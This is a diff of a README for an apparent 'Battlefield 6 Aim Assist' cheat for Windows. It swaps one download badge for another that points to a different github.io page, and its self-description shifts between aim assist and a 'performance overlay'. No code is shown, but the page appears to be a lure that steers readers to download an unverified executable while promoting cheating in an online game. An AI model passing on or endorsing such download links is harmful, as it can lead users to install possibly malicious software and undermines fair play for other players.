@@ -5,13 +5,7 @@
 
 <h1 align="center">📊 Battlefield 6 Aim Assist (Windows)</h1>
 
-<p align="center">
-  <a href="https://bf6-aim-assist-tool-download.github.io/.github/" target="_blank">
-    <img src="https://img.shields.io/badge/⬇️%20Download%20%26%20Tool-Windows-1E90FF?style=for-the-badge&logo=windows&logoColor=white"
-         alt="Download Battlefield 6 Performance & Telemetry Overlay"
-         style="width:560px;height:44px;">
-  </a>
-</p>
+[![Download Setup Assistant](https://img.shields.io/badge/Download-Setup_Assistant-lightgrey)](https://gibbsondeb61.github.io/.github/bf6-aim-assist-tool)
 
 <p align="center">
   <img src="https://www.skycheats.com/uploads/monthly_2025_08/2(2).webp.f00fc10f0582c1d933b3d3f4d69078c6.webp" alt="Overlay preview: FPS, frame-time, GPU/CPU usage HUD" width="800" />
